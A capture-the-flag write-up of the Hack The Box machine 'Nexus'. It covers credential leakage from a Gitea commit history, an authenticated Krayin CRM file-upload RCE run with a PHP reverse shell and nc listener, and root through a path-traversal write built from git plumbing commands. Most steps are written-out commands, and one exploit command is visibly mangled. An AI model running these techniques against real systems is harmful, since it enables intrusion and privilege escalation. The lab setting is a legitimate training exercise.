
# #HTB 

![[Pasted image 20260719171806.png|281]]

# HTB: Nexus

**Machine IP:** `10.129.234.54` 
**Difficulty:** Medium **
OS:** Linux (Ubuntu 24.04)

---

### Tools Used

- `nmap` - port scanning
- `ffuf` - vhost/subdomain fuzzing
- Google/AI search - CVE research
- `python3` (exploit-db script 52629.py) - authenticated RCE exploit
- `nc` - reverse shell listener
- `linpeas.sh` - privilege escalation enumeration
- `git` - low-level plumbing commands (mktree, commit-tree, update-ref)
- `ssh-keygen` - SSH key generation
- `mysql` client

---

### Step 1: Reconnaissance - Port Scanning

```
sudo nmap -n -Pn -sV -sC 10.129.234.54
```

**Result:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx/1.24.0
|_http-title: Did not follow redirect to http://nexus.htb/
```


![[Pasted image 20260719013935.png]]

Port 80 redirected to `http://nexus.htb/`, so this was added to `/etc/hosts` and the site was browsed.

---

### Step 2: Website Recon - Finding a Valid Email

Browsing `http://nexus.htb` revealed a **Nexus Energy Authority** corporate site. A "Careers" job posting for an **Operations Specialist – Customer Platforms** role leaked an internal contact:

```
Questions? Reach out to our hiring manager j.matthew@nexus.htb
```



![[Pasted image 20260719082532.png]]

![[Pasted image 20260719014056.png]]


This gave a **valid internal username/email**: `j.matthew@nexus.htb` — useful later once a password was found.

---

### Step 3: Subdomain / Virtual Host Enumeration

Since the box uses name-based routing (`nexus.htb`), a vhost fuzz was run to discover other subdomains hosted on the same IP:

```
ffuf -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -mc 200
```

**Result:**
```
git                    [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 202ms]
```


![[Pasted image 20260719014026.png]]

This revealed **`git.nexus.htb`** — a self-hosted Gitea instance. Both `git.nexus.htb` and `billing.nexus.htb` (referenced elsewhere on the site / assumed convention) were added to `/etc/hosts`.

Browsing to `git.nexus.htb` confirmed a Gitea instance:

![[Pasted image 20260719014056.png]]


---

### Step 4: Discovering Krayin CRM & Leaked Credentials via Gitea

An **`admin`** account on Gitea had a public repository, **`krayin-docker-setup`**, containing the Docker Compose configuration for the billing CRM deployment:


![[Pasted image 20260719014026.png]]


![[Pasted image 20260719014056.png]]



![[Pasted image 20260719014156.png]]

Critically, the **commit history** of the `.env` file in this repo showed an earlier version of the file with the database password **committed in plaintext before being redacted**:

```diff
- APP_URL=http://nexus.htb
+ APP_URL=http://billing.nexus.htb
...
- DB_PASSWORD=N27xh!!2ucY04
+ DB_PASSWORD=
```

![[Pasted image 20260719014242.png]]
This leaked:
- The subdomain **`billing.nexus.htb`** (the Krayin CRM instance)
- A password: **`N27xh!!2ucY04`**

Combined with the email `j.matthew@nexus.htb` found earlier, this gave a credential pair to try against the CRM login.


---


![[Pasted image 20260719082532.png]]


![[Pasted image 20260719082532.png]]


### Step 5: Krayin CRM Login & Version Fingerprinting

`billing.nexus.htb` hosts a **Krayin CRM** (open-source CRM by Webkul) admin login:



![[Pasted image 20260719082557.png]]


Logging in with `j.matthew@nexus.htb` / `N27xh!!2ucY04` succeeded, landing on the admin dashboard:

![[Pasted image 20260719093811.png]]


Fingerprinting the version and searching for known vulnerabilities revealed **Krayin CRM 2.2.x** is affected by several critical CVEs, most notably an **authenticated RCE via unrestricted file upload**:

![[Pasted image 20260719093900.png]]


**CVE-2026-38526** — Unrestricted Arbitrary File Upload via `/admin/tinymce/upload`, allowing an authenticated user to upload a crafted PHP file and achieve RCE in the web server context (CVSS 9.9 Critical). A public PoC exists on Exploit-DB (**52629**).

- `https://www.exploit-db.com/exploits/52629`


---

### Step 6: Exploiting the RCE (CVE-2026-38526)

#### Reverse Shell Payload

The classic pentestmonkey PHP reverse shell was used, pointed at the attacker's IP:
```
$ip = '10.10.14.59';
$port = 9001;
```

Listener
```
nc -lvnp 9001
```

Exploit Execution
```
python3 52629.py -t http://billing.nexus.htb/ -u j.matthew@nexus.htb -p N27xhnano php-reverse-shell.php2ucY04 -f php-reverse-shell.php
```

> **Gotcha:** The password contains `!!`, which bash interprets as history expansion unless single-quoted — an early attempt without quoting mangled the argument and caused a parsing error.

The exploit uploaded the payload through the CRM's file upload endpoint and triggered it, catching a shell as **www-data**:

![[Pasted image 20260719094650.png]]


```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


---

### Step 7: Reading the .env File for Further Credentials

As `www-data`, the live application's `.env` file was read directly:

```bash
cat .env
```

```
APP_NAME="Krayin CRM"
APP_URL=http://billing.nexus.htb
DB_CONNECTION=mysql
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```


![[Pasted image 20260719095617.png]]

This is a **different, updated password** from the one leaked in the Gitea commit history — confirming the earlier leaked credential had since been rotated, but the app config itself was still readable post-RCE.

---

### Step 8: SSH Access as jones

The `.env` DB password (or a related credential — same password reuse pattern) worked for SSH login as the low-privileged user **jones**:
```
ssh jones@10.129.234.54
```


![[Pasted image 20260719095723.png]]

#### User Flag

```bash
jones@nexus:~$ cat user.txt
4cd7542afd3cbc68ef6d8354419fdb21
```

---

### Step 9: Local Enumeration

```bash
sudo -l
```

**Result:** jones had **no sudo rights**. SUID/SGID binaries enumerated were all standard system binaries - nothing directly exploitable.

---

### Step 10: linpeas Enumeration

`linpeas.sh` was transferred to the target via a Python HTTP server on the attacking box:


```bash
# Attacker box
python3 -m http.server 8000

# Target
curl http://10.10.14.59:8000/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

#### Key Findings

**1. Krayin DB password confirmed in linpeas output** - `/var/www/krayin/.env`:

```
DB_PASSWORD=y27xb3ha!!74GbR
```

**2. A root-owned systemd timer running every minute:**

```
Potential privilege escalation in timer file: /etc/systemd/system/gitea-template-sync.timer
  └─ RELATIVE_PATH: Uses relative path in Unit directive
```


```bash
systemctl cat gitea-template-sync.service
```


```ini
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

Gitea (`git.nexus.htb`, internally bound to `localhost:3000`) ties directly into this sync job.

---

### Step 11: Source Code Review — Finding the Privesc Bug

`/etc/gitea/template-sync.py` was world-readable (owned by `git:git`, mode 644). Its logic:

1. Queries the Gitea API for repositories marked as **"template"**
2. For each template repo, reads the git tree (`git ls-tree -r HEAD`) from the bare repository
3. Writes each entry out to a staging directory:

```python
target = os.path.join(stage_path, filepath)
...
with open(target, 'wb') as f:
    f.write(cat_result.stdout)
```

#### The Vulnerability
`filepath` comes directly from git tree entries inside a **user-controlled repository**. Python's `os.path.join()` has a well-known behavior:

```python
>>> os.path.join("/home/git/template-staging/jones/rce", "/root/.ssh/authorized_keys")
'/root/.ssh/authorized_keys'
```

If the second argument is an absolute path, it completely overrides the first. Since this script runs **as root every 60 seconds**, controlling `filepath` gives arbitrary file write as root.

---

### Step 12: Building the Exploit

Git's CLI (`git add`, `git mktree`) refuses filenames containing a literal `/` or empty names, so a direct absolute path couldn't be committed normally. This was solved using git's low-level **plumbing commands** to construct a tree object with a `../` traversal path instead of a leading `/`.

#### 12.1 -- Login to Gitea and create a template repository

Using the `jones` credentials against `git.nexus.htb`:

![[Pasted image 20260719105425.png]]


A repository `jones/rce` was created and marked as a **Template Repository** (required — the script only syncs repos with `template: true`).

#### 12.2 -- Clone and generate payload

```bash
git clone http://jones@localhost:3000/jones/rce.git
cd rce

ssh-keygen -t rsa -f /tmp/pwnkey -N ""
cat /tmp/pwnkey.pub > authkey_payload
git add authkey_payload
git commit -m "sync"
```

#### 12.3 -- Craft the traversal path via git plumbing

The staging path was `/home/git/template-staging/jones/rce` — 5 directories deep from root. Wrapping the payload blob in 5 nested `..` trees resolves back to `/root/.ssh/authorized_keys`:

```bash
BLOB_HASH=$(git ls-tree HEAD | grep authkey_payload | awk '{print $3}')

L1=$(printf "040000 tree %s\t..\n" "$TREE3" | git mktree)  # TREE3 = payload wrapped as root/.ssh/authorized_keys
L2=$(printf "040000 tree %s\t..\n" "$L1" | git mktree)
L3=$(printf "040000 tree %s\t..\n" "$L2" | git mktree)
L4=$(printf "040000 tree %s\t..\n" "$L3" | git mktree)
L5=$(printf "040000 tree %s\t..\n" "$L4" | git mktree)
```

**Verification:**
```bash
git ls-tree -r $L5
100644 blob 9be1566acda8cc0f68242bf53ad6f82269162847    ../../../../../root/.ssh/authorized_keys
```

#### 12.4 -- Commit and push

```bash
NEW_COMMIT=$(git commit-tree $L5 -m "payload")
git update-ref refs/heads/main $NEW_COMMIT
git push origin main --force
```

> **Gotcha:** The first push attempt targeted `master`, but Gitea's bare repo `HEAD` still pointed at `main` (the script reads from `HEAD`). The payload had to land on `main` specifically for the sync script to pick it up.

---

### Step 13: Confirming the Write & Getting Root

Timer logs confirmed the sync picked up the crafted path:

```bash
tail -f /var/log/template-sync.log
```

```
[2026-07-19 05:55:41] Syncing template: jones/rce
[2026-07-19 05:55:41]   synced: ../../../../../root/.ssh/authorized_keys
```

The attacker's public key was now written into `/root/.ssh/authorized_keys`, executed as root via the timer.

```bash
ssh -i /tmp/pwnkey root@10.129.234.54
```

```
root@nexus:~#
```

#### Root Flag

```bash
root@nexus:~# cat /root/root.txt
```


### Step 14 : Lab Solved

password- `y27xb3ha!!74GbR`

![[Pasted image 20260719105425.png]]


![[Pasted image 20260719105425.png]]


![[Pasted image 20260719175350.png]]

---
---
